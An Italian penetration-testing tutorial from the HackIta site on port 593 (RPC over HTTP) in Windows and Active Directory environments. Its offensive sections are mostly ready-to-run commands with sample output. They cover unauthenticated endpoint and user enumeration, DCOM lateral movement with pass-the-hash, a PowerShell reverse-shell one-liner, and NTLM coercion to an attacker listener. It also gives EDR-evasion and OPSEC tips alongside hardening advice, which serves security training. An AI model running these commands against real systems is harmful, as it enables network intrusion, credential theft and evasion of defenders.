---
title: 'Porta 593 RPC over HTTP: IOXIDResolver, endpoint enumeration e DCOM stealth.'
slug: porta-593-rpc-http
description: >-
  Scopri cos’è la porta 593 http-rpc-epmap, come funziona ncacn_http in ambiente
  Microsoft e perché RPC over HTTP può esporre endpoint, servizi DCOM e
  informazioni utili sulla superficie RPC enterprise.
image: /porta-593-rpc-http.webp
draft: false
date: 2026-04-06T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - ioxidresolver
  - dcomexec
---

> **Executive Summary** — La porta 593 espone il servizio RPC over HTTP (ncacn\_http), la variante HTTP del classico endpoint mapper RPC sulla porta 135. La sua presenza indica infrastruttura Microsoft — Exchange (Outlook Anywhere), Active Directory o servizi DCOM. L'enumerazione senza autenticazione rivela interfacce di rete interne (IOXIDResolver), endpoint registrati e servizi attivi. Con credenziali valide, DCOM fornisce lateral movement stealth. Questa guida copre endpoint enumeration, IOXIDResolver, DCOM execution e authentication coercion.

* La porta 593 RPC/HTTP è la versione HTTP dell'endpoint mapper (135) — indica Exchange, AD o DCOM esposto
* IOXIDResolver estrae hostname e IP interni (IPv4/IPv6) senza autenticazione
* DCOM lateral movement è più stealth di PsExec: esegue comandi senza creare servizi o scrivere su disco

Porta 593 RPC over HTTP è il canale TCP usato da Microsoft per tunnelizzare le chiamate RPC attraverso HTTP, bypassando firewall che bloccano la porta 135. La porta 593 vulnerabilità principali sono l'information disclosure senza autenticazione (IOXIDResolver), l'enumerazione completa degli endpoint RPC e l'abuso di DCOM per lateral movement. L'enumerazione porta 593 rivela servizi registrati, interfacce di rete nascoste e spesso la topologia interna dell'infrastruttura AD. Nel pentest, la 593 è una porta ad alto valore perché indica infrastruttura Windows enterprise — e ogni informazione estratta alimenta direttamente la fase di AD attack. Nella kill chain si posiziona tra recon (endpoint + network info) e lateral movement (DCOM execution).

## 1. Anatomia Tecnica della Porta 593

La porta 593 è registrata IANA come `http-rpc-epmap`. È l'endpoint mapper per il trasporto `ncacn_http` (RPC over HTTP). Quando un client vuole connettersi a un servizio RPC via HTTP, contatta prima la 593 che gli indica la porta dinamica del servizio richiesto — esattamente come la 135 fa per `ncacn_ip_tcp`.

Il flusso RPC over HTTP v2:

1. Il client si connette alla porta 593 del server
2. Richiede il mapping per una specifica interfaccia RPC (identificata da UUID)
3. Il server risponde con la porta dinamica assegnata
4. Il client stabilisce il tunnel HTTP verso quella porta
5. Le chiamate RPC viaggiano all'interno della connessione HTTP

L'architettura coinvolge tre componenti: client RPC, RPC Proxy (IIS con virtual directory `/rpc`) e backend RPC server. Exchange usa questo per Outlook Anywhere, permettendo ai client di connettersi via internet.

```
Misconfig: Porta 593 esposta su interfaccia pubblica
Impatto: enumerazione completa degli endpoint RPC da Internet
Come si verifica: nmap -sV -p 593 [target] — se open da Internet, è esposto
```

```
Misconfig: IOXIDResolver accessibile senza autenticazione
Impatto: leak di hostname, IP interni (IPv4 e IPv6) — mappa la rete interna
Come si verifica: python3 IOXIDResolver.py -t [target]
```

```
Misconfig: DCOM abilitato su interfacce non necessarie
Impatto: lateral movement stealth con credenziali valide
Come si verifica: dcomexec.py domain/user:pass@[target] "whoami"
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 593 10.10.10.10
```

**Output atteso:**

```
PORT    STATE SERVICE        VERSION
593/tcp open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
```

**Parametri:**

* `-sV`: conferma che è RPC over HTTP Microsoft
* `-sC`: script default per enumerazione base
* `-p 593`: porta endpoint mapper HTTP

### Comando 2: Verifica servizio con rpcdump

```bash
rpcdump.py 10.10.10.10 -p 593
```

**Output atteso:**

```
Protocol: [MS-EVEN6]: EventLog Remoting Protocol Version 6.0
Provider: eventlog.dll
UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0
Bindings:
          ncacn_http:10.10.10.10[593]

Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
Bindings:
          ncacn_http:10.10.10.10[593]
```

**Cosa ci dice questo output:** due servizi RPC registrati — EventLog e Print Spooler. Il Print Spooler è rilevante per PrintNightmare e authentication coercion. Ogni UUID identifica un'interfaccia RPC specifica che può essere interrogata.

## 3. Enumerazione Avanzata

### IOXIDResolver — Information disclosure senza auth

L'interfaccia IOXIDResolver (IObjectExporter) espone il metodo `ServerAlive2()` che restituisce tutte le interfacce di rete del server — senza autenticazione.

```bash
python3 IOXIDResolver.py -t 10.10.10.10
```

**Output:**

```
[*] Retrieving network interface of 10.10.10.10
Address: DC01
Address: 10.10.10.10
Address: 192.168.100.10
Address: dead:beef::1
```

**Lettura dell'output:** il server si chiama `DC01` (domain controller!), ha due interfacce IPv4 (10.10.10.10 visibile e 192.168.100.10 su un'altra rete) e un IPv6. L'IP 192.168.100.10 è probabilmente una rete di management non visibile dal tuo segmento. Queste informazioni sono fondamentali per la [fase di ricognizione AD](https://hackita.it/articoli/active-directory).

### RPC endpoint enumeration completa

```bash
rpcmap.py 'ncacn_http:10.10.10.10[593]' -brute-uuids -brute-opnums
```

**Output:**

```
UUID: D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 - ACCESSIBLE
UUID: 12345778-1234-ABCD-EF00-0123456789AC v1.0 - ACCESSIBLE (SAMR)
UUID: E1AF8308-5D1F-11C9-91A4-08002B14A0FA v3.0 - ACCESSIBLE (LSARPC)
UUID: 12345678-1234-ABCD-EF00-0123456789AB v1.0 - ACCESSIBLE (SPOOLSS)
```

**Lettura dell'output:** SAMR (gestione utenti), LSARPC (policy di sicurezza) e SPOOLSS (print spooler) sono accessibili. SAMR e LSARPC permettono enumerazione AD. SPOOLSS è il vettore per authentication coercion (PrinterBug/SpoolSample).

### Enumerazione AD via rpcclient (con null session o credenziali)

```bash
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
```

**Output:**

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[krbtgt] rid:[0x1f6]
user:[svc_sql] rid:[0x44f]
user:[j.smith] rid:[0x450]
```

**Lettura dell'output:** null session funzionante — enumerazione utenti completa senza credenziali. `svc_sql` è un service account (target per Kerberoasting). Per continuare l'attacco AD, scopri come eseguire [Kerberoasting e AS-REP Roasting](https://hackita.it/articoli/kerberos).

## 4. Tecniche Offensive

**DCOM lateral movement — ShellWindows**

Contesto: hai credenziali di dominio con admin locale sul target. Vuoi eseguire comandi senza creare servizi (più stealth di PsExec).

```bash
dcomexec.py -object ShellWindows domain/admin:Password123@10.10.10.20 'whoami'
```

**Output (successo):**

```
domain\admin
```

**Output (fallimento):**

```
[-] DCOM SessionError: code: 0x80070005 - ERROR_ACCESS_DENIED
```

**Cosa fai dopo:** hai esecuzione remota. DCOM non crea servizi, non scrive binari su disco e non genera i classici log di PsExec. Puoi eseguire comandi, scaricare file, o lanciare una shell. Per una reverse shell stealth: `dcomexec.py -object MMC20 domain/admin:pass@10.10.10.20 'powershell -e [base64_revshell]'`. Approfondisci le [tecniche di post-exploitation](https://hackita.it/articoli/post-exploitation).

**DCOM con Pass-the-Hash**

Contesto: hai un hash NTLM ma non la password in chiaro.

```bash
dcomexec.py -object ShellBrowserWindow -hashes :a1b2c3d4e5f6a7b8a1b2c3d4e5f6a7b8 domain/admin@10.10.10.20
```

**Output (successo):**

```
C:\Windows\system32>
```

**Cosa fai dopo:** shell interattiva via DCOM con PtH. Nessuna password in chiaro necessaria. Per estrarre ulteriori hash, usa mimikatz o secretsdump.

**Authentication coercion — PrinterBug/SpoolSample**

Contesto: forza un server a inviare una richiesta di autenticazione NTLM al tuo listener (Responder o ntlmrelayx).

```bash
# Avvia il listener
sudo responder -I eth0

# Coerci l'autenticazione dal target
python3 printerbug.py domain/user:pass@10.10.10.10 10.10.10.200
```

**Output (successo — su Responder):**

```
[SMB] NTLMv2-SSP Hash: DC01$::DOMAIN:1122334455667788:AABBCCDD...
```

**Cosa fai dopo:** hai l'hash NTLMv2 del computer account del DC. Se il target è un DC, puoi usare ntlmrelayx per LDAP relay e ottenere DCSync. Per la catena completa, consulta la guida alla [compromissione Active Directory](https://hackita.it/articoli/active-directory).

**Coercer — scan multiplo per coercion**

```bash
coercer scan -t 10.10.10.10 -u user -p pass -d domain.local
```

**Output:**

```
[+] MS-RPRN (PrinterBug) - VULNERABLE
[+] MS-EFSRPC (PetitPotam) - VULNERABLE  
[+] MS-DFSNM (DFSCoerce) - PATCHED
[-] MS-FSRVP (ShadowCoerce) - NOT VULNERABLE
```

**Lettura dell'output:** due vettori di coercion funzionanti: PrinterBug e PetitPotam. DFSCoerce è stato patchato. Usa quello più adatto al tuo scenario.

## 5. Scenari Pratici di Pentest

### Scenario 1: AD internal pentest

**Situazione:** engagement interno con accesso alla rete corporate. La porta 593 è aperta sui domain controller.

**Step 1:**

```bash
nmap -sV -p 135,593 10.10.10.0/24 --open
```

**Output atteso:**

```
10.10.10.10 - 593/tcp open ncacn_http (DC01)
10.10.10.11 - 593/tcp open ncacn_http (EXCH01)
```

**Step 2:**

```bash
python3 IOXIDResolver.py -t 10.10.10.10
rpcdump.py 10.10.10.10 -p 593
```

**Se fallisce:**

* Causa probabile: firewall interno blocca la 593 dal tuo segmento
* Fix: testa la 135 (endpoint mapper standard) che è più spesso accessibile

**Tempo stimato:** 5-10 minuti per l'enumerazione

### Scenario 2: Exchange Outlook Anywhere esposto

**Situazione:** external pentest. Exchange con porta 593 aperta su Internet (Outlook Anywhere).

**Step 1:**

```bash
nmap -sV -p 593,443 [target_ip]
```

**Step 2:**

```bash
rpcdump.py [target_ip] -p 593
python3 IOXIDResolver.py -t [target_ip]
```

**Se fallisce:**

* Causa probabile: IIS proxy blocca le richieste RPC non Outlook
* Fix: concentrati sull'interfaccia web di Exchange (OWA) sulla 443

**Tempo stimato:** 5-10 minuti

### Scenario 3: Lateral movement post-compromise

**Situazione:** hai credenziali di dominio (admin locale su più macchine). Vuoi muoverti senza rumore.

**Step 1:**

```bash
crackmapexec smb 10.10.10.0/24 -u admin -p pass -d domain.local
# Identifica host dove sei admin locale
```

**Step 2:**

```bash
dcomexec.py -object ShellWindows domain/admin:pass@10.10.10.20 'whoami'
```

**Se fallisce:**

* Causa probabile: DCOM bloccato da Windows Firewall o GPO
* Fix: prova con `wmiexec.py` (WMI) come alternativa

**Tempo stimato:** 2-5 minuti per host

## 6. Attack Chain Completa

| Fase          | Tool               | Comando chiave                     | Output/Risultato       |
| ------------- | ------------------ | ---------------------------------- | ---------------------- |
| Recon         | nmap               | `nmap -sV -p 593 [subnet]`         | Host con RPC/HTTP      |
| Network Info  | IOXIDResolver      | `IOXIDResolver.py -t [target]`     | IP interni, hostname   |
| Endpoint Enum | rpcdump            | `rpcdump.py [target] -p 593`       | Servizi RPC registrati |
| AD Enum       | rpcclient          | `enumdomusers`                     | Utenti di dominio      |
| Auth Coercion | printerbug/coercer | `printerbug.py` → responder        | Hash NTLMv2            |
| Lateral Move  | dcomexec           | `dcomexec.py -object ShellWindows` | RCE stealth            |

**Timeline stimata:** 10-30 minuti dalla discovery al lateral movement.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Event log**: DCOM genera eventi 10016 (DistributedCOM) nei System log
* **EDR**: alcuni EDR flaggano `dcomexec` come lateral movement noto
* **Firewall**: connessioni alla 593 da subnet non autorizzate

### Tecniche di Evasion

```
Tecnica: MMC20 invece di ShellWindows
Come: usa -object MMC20 — meno rilevato dagli EDR rispetto a ShellWindows
Riduzione rumore: MMC20 genera meno eventi e usa un diverso percorso di esecuzione
```

```
Tecnica: Limita IOXIDResolver a singoli target
Come: non scansionare l'intera subnet con IOXIDResolver — uno alla volta
Riduzione rumore: le query IOXIDResolver massive generano traffico RPC anomalo
```

## 8. Toolchain e Confronto

| Aspetto       | RPC/HTTP (593) | RPC TCP (135) | WinRM (5985)  | SMB (445)      |
| ------------- | -------------- | ------------- | ------------- | -------------- |
| Porta         | 593/TCP        | 135/TCP       | 5985/TCP      | 445/TCP        |
| Protocollo    | RPC over HTTP  | RPC nativo    | WS-Management | SMB/CIFS       |
| Lateral Move  | DCOM           | DCOM          | WinRM         | PsExec/SMBExec |
| Auth Coercion | Sì (via RPC)   | Sì            | No (diretto)  | No (diretto)   |
| Stealth       | Medio-alto     | Medio         | Medio         | Basso          |

## 9. Troubleshooting

| Errore / Sintomo      | Causa                               | Fix                                              |
| --------------------- | ----------------------------------- | ------------------------------------------------ |
| 593 filtered          | Firewall blocca                     | Prova 135 (RPC standard)                         |
| IOXIDResolver timeout | Server non risponde a ServerAlive2  | Potrebbe essere patchato — prova rpcdump         |
| DCOM Access Denied    | Non sei admin locale sul target     | Verifica con `crackmapexec smb` prima            |
| rpcdump nessun output | Nessun endpoint registrato via HTTP | Prova `rpcdump.py [target]` (usa 135 di default) |

## 10. FAQ

**D: Che differenza c'è tra la porta 593 e la 135?**

R: Entrambe sono endpoint mapper per RPC. La 135 usa il trasporto TCP nativo, la 593 tunnelizza via HTTP. La 593 è usata quando serve attraversare firewall che bloccano la 135 (es: Outlook Anywhere per Exchange).

**D: IOXIDResolver è sfruttabile senza credenziali?**

R: Sì. `ServerAlive2()` non richiede autenticazione e restituisce hostname, IP (IPv4 e IPv6) di tutte le interfacce di rete del server. È una delle information disclosure più utili in un pentest.

**D: DCOM è più stealth di PsExec?**

R: Sì. PsExec crea un servizio temporaneo e scrive un binario su disco — entrambi generano log facilmente rilevabili. DCOM esegue comandi tramite oggetti COM senza creare servizi né scrivere file, rendendo la detection più difficile.

**D: Come proteggere la porta 593?**

R: Blocca la 593 sui firewall perimetrali. Internamente, limita l'accesso via Windows Firewall. Per Exchange, usa HTTPS proxy (443) invece di RPC/HTTP. Disabilita il Remote Registry e limita le interfacce DCOM con GPO.

## 11. Cheat Sheet Finale

| Azione        | Comando                                                      | Note                   |
| ------------- | ------------------------------------------------------------ | ---------------------- |
| Scan RPC/HTTP | `nmap -sV -p 593 [subnet]`                                   | Indica Exchange/AD     |
| IOXIDResolver | `IOXIDResolver.py -t [target]`                               | IP interni senza auth  |
| Endpoint dump | `rpcdump.py [target] -p 593`                                 | Servizi RPC registrati |
| UUID brute    | `rpcmap.py 'ncacn_http:[target][593]' -brute-uuids`          | Interfacce nascoste    |
| AD enum       | `rpcclient -U "" -N [target]` → `enumdomusers`               | Null session           |
| Auth coercion | `printerbug.py domain/user:pass@[target] [attacker]`         | Hash NTLMv2            |
| Coercion scan | `coercer scan -t [target] -u user -p pass`                   | Tutti i vettori        |
| DCOM exec     | `dcomexec.py -object ShellWindows domain/user:pass@[target]` | Lateral stealth        |
| DCOM PtH      | `dcomexec.py -hashes :[hash] domain/user@[target]`           | Pass-the-Hash          |

### Perché Porta 593 è rilevante nel 2026

La porta 593 indica infrastruttura Microsoft enterprise — Exchange, Active Directory, DCOM. IOXIDResolver resta un leak informativo gratuito, l'authentication coercion continua a evolversi (Unit 42 nel 2025 ha documentato nuovi vettori RPC), e DCOM rimane il metodo di lateral movement preferito dai red team per la sua bassa visibilità. CVE-2024-43532 (Remote Registry) e CVE-2025-29969 (MS-EVEN race condition) dimostrano che la superficie RPC è ancora in espansione.

### Hardening e Mitigazione

* Blocca la 593 sui firewall perimetrali — non deve essere esposta su Internet
* Limita DCOM via GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies
* Disabilita null session: `RestrictAnonymous = 2` nel registry
* Patcha per authentication coercion: CVE-2024-43532, PetitPotam, PrintNightmare

### OPSEC per il Red Team

IOXIDResolver è una singola richiesta RPC — basso profilo. rpcdump è più rumoroso (enumera tutti gli endpoint). DCOM genera evento 10016 ma è spesso ignorato. Per massima stealth: usa DCOM con MMC20, limita le query IOXIDResolver ai target specifici e non enumerare l'intera subnet.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: MS-RPCE, CVE-2024-43532, CVE-2025-29969. Approfondimento: [https://www.speedguide.net/port.php?port=593](https://www.speedguide.net/port.php?port=593)

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
